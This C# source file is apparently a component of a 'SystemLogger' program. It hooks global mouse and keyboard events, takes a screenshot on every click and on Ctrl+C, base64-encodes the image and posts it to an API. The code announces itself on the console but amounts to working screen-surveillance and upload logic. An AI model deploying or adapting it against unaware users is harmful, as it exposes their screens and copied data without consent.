using Gma.System.MouseKeyHook;
using System;
using System.Buffers.Text;
using System.Collections.Generic;
using System.Drawing.Imaging;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using SystemLogger.Sender;
using SystemLogger.Util;

namespace SystemLogger.Watchers
{
    internal class KeyboardAndMouse
    {
        

        private IMouseEvents _MouseHook;

        private IKeyboardEvents _KeyboardHook;
        public KeyboardAndMouse()
        {

        }


        public void Start()
        {
            _KeyboardHook = Hook.GlobalEvents();
            _MouseHook = Hook.GlobalEvents();
            DetectCombinationsAndClicks();
            Console.WriteLine("Monitorando teclas e cliques Pressione ctrl+c para sair.");
        }

        public void DetectCombinationsAndClicks()
        {
            var map = new Dictionary<Combination, Action>{
                {Combination.FromString("Control+C"),()=>
                    {
                        Console.WriteLine("Control + C detectado!");
                        ScreenshotEvent.CaptureScreen();
                        sendToApi("control+c");
                    } 
                }
            };

            _MouseHook.MouseClick += (sender, e) =>
            {
                Console.WriteLine("Click Detectado");
                ScreenshotEvent.CaptureScreen();
                sendToApi("click");
            };



            _KeyboardHook.OnCombination(map);
        }

        

        private void sendToApi(string type)
        {

            string path = ScreenshotEvent.tempPath + "\\capture.jpeg";
            string imgString = ImageConv.ConverterToBase64(path);
            Object obj = new
            {
                tipoEvento = type,
                timestamp = DateTime.Now,
                image = imgString,
            };
            Console.WriteLine(obj);
            PostToApi.Post(obj);
        }

    }
}
